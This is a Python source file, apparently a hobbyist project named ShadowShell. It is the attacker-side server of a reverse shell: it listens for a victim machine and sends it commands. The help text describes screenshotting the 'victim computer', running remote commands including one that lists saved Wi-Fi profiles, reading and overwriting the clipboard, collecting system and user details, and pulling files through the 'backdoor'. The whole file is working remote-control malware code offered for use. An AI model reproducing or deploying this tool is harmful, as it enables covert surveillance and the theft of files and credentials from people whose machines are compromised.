#python reverse shell
#by aminXD
#------------------------
# import modules
from socket import socket, AF_INET, SOCK_STREAM, gethostbyname, gethostname
import os, sys, bz2
from PIL import Image
from colorama import init
from colorama import Fore
from random import choice
from string import ascii_letters
from time import sleep
os.system("title ShadowShell")
try:
    os.system("cls") # clear screen in windows
except:
    pass
try:
    os.system("clear") # clear screen in linux
except:
    pass
init()
class Color: #class color for color art
    def art(self, text: str) -> str:
        result = []
        for word in text:
            if word == "[" or word == "]":
                result.append(Fore.MAGENTA)
                result.append(word)
            elif word in "/\\_-":
                result.append(Fore.LIGHTMAGENTA_EX)
                result.append(word)
            elif word in "<>":
                result.append(Fore.LIGHTBLUE_EX)
                result.append(word)
            elif word == ".":
                result.append(Fore.YELLOW)
                result.append(word)
            elif word == "X":
                result.append(Fore.RED)
                result.append(word)
            elif word in "`~":
                result.append(Fore.CYAN)
                result.append(word)
            elif word in "1234567890":
                result.append(Fore.LIGHTCYAN_EX)
                result.append(word)
            elif word in "!@#$%^&":
                result.append(Fore.LIGHTBLACK_EX)
                result.append(word)
            elif word in "*:":
                result.append(Fore.LIGHTYELLOW_EX)
                result.append(word)
            elif word == "+":
                result.append(Fore.GREEN)
                result.append(word)
            else:
                result.append(Fore.RESET)
                result.append(word)
            result.append(Fore.RESET)            
        return "".join(a for a in result)
color = Color()
tcp = socket(AF_INET, SOCK_STREAM) # make socket class (ipv4, tcp connect)
screen_count = 0 # for make screenshot file
commands = ("""
Help:
screen -> take screenshot from The victim computer.
command -> send command (like command netsh wlan show profiles), Warning! -> never use input and output command (like netsh or date).
exit -> stop socket connection.
getclip -> get clipboard data (if clipboard == clear, program show Nothing :-)).
clearclip -> clear clipboard data.
setclip -> set clipboard data (like setclip 1234).
sysinfo -> get vicitim pc info.
getuser -> get current vicitim pc user.
path -> get current backdoor directory.
chdir -> change backdoor directory.
check -> check connection.
get -> get file from vicitim.
""".title()) # help command result
port = 1660 # set port
tcp.bind(("", port)) # bind the ip and port
tcp.listen(1) # listening requests
print(color.art(f"[*] server started. port -> {port}".title()))
print(color.art("[*] Wait For Connection..."))
c, addr = tcp.accept() #wait for client connect
print(color.art(f"[!] Found Connection From {addr[0]}"))
while True:
    print(color.art(f"{addr[0]}:{addr[1]}> "),end="")
    cmd = input("") # get user command
    if cmd.split(" ")[0].lower() == "command":
        if len(cmd.split(" ")) != "1":
            c.send(bz2.compress(cmd.encode()))
            print(bz2.decompress(c.recv(1048576000)).decode())
    elif cmd.split(" ")[0].lower() == "exit":
        c.send(bz2.compress("exit".encode()))
        sys.exit()
    elif cmd.split(" ")[0].lower() == "help":
        print(color.art(commands))
    elif cmd.split(" ")[0].lower() == "screen":
        c.send(bz2.compress(cmd.split(" ")[0].encode()))
        data = bz2.decompress(c.recv(1048576000)) # recieve data
        screen_count += 1
        file = open(f"{screen_count}.jpg","wb")
        file.write(data)
        file.close()
        print(color.art(f"[+] Saved Screenshot to {screen_count}.jpg"))
        with Image.open(f"{screen_count}.jpg") as img: img.show()
    elif cmd.split(" ")[0].lower() == "getclip":
        c.send(bz2.compress(cmd.split(" ")[0].encode()))
        data = bz2.decompress(c.recv(1048576000)).decode()
        print(color.art(f"[*] data -> {data}"))
    elif cmd.split(" ")[0].lower() == "clearclip":
        c.send(bz2.compress(cmd.split(" ")[0].encode()))
        print(color.art("[+] clipboard data cleared successfully.".title()))
    elif cmd.split(" ")[0].lower() == "setclip":
        if len(cmd.split()[0]) != 1:
            c.send(bz2.compress(str(cmd).encode()))
            print(color.art("[+] clipboard data seted successfully.".title()))
    elif cmd.split(" ")[0].lower() == "getuser":
        c.send(bz2.compress(cmd.split(" ")[0].encode()))
        user = bz2.decompress(c.recv(1024)).decode()
        print(color.art(f"[*] user -> {user}".title()))
    elif cmd.split(" ")[0].lower() == "sysinfo":
        answer = input("Short Or Full?> ").lower()
        if answer == "short":
            c.send(bz2.compress(b"sysinfo short"))
            info = bz2.decompress(c.recv(1024)).decode()
            print(color.art(info))
        elif answer == "full":
            c.send(bz2.compress(b"sysinfo full"))
            info = bz2.decompress(c.recv(1000000)).decode()
            print(color.art(info))
    elif cmd.split(" ")[0].lower() == "path":
        c.send(bz2.compress(b"path"))
        path = bz2.decompress(c.recv(1024)).decode()
        print(color.art(f"[*] Path -> {path}"))
    elif cmd.split(" ")[0].lower() == "chdir":
        c.send(bz2.compress(cmd.encode()))
        path = cmd.split(" ")[1].lower()
        data = bz2.decompress(c.recv(1024)).decode()
        if data == "No":
            print(color.art(f"[X] Dir Not Found."))
        elif data == "Down":
            print(color.art(f"[+] Changed Directory To {path}"))
    elif cmd.split(" ")[0].lower() == "check":
        try:
            c.send(bz2.compress(b"check"))
        except:
            print(color.art("[X] Client Are Not Online!"))
            sys.exit()
        print(color.art("[+] Client Is Online"))
    elif cmd.split(" ")[0].lower() == "get":
        c.send(bz2.compress(cmd.encode()))
        data = c.recv(10000000)
        result = bz2.decompress(data)
        del(data) # Just For Memory Free Up
        name = "".join(cmd[4:])
        with open(f"Copy_{name}","wb") as f: f.write(result)
    else:
        print(color.art("X_X What?. Enter Help Command Too See Commands."))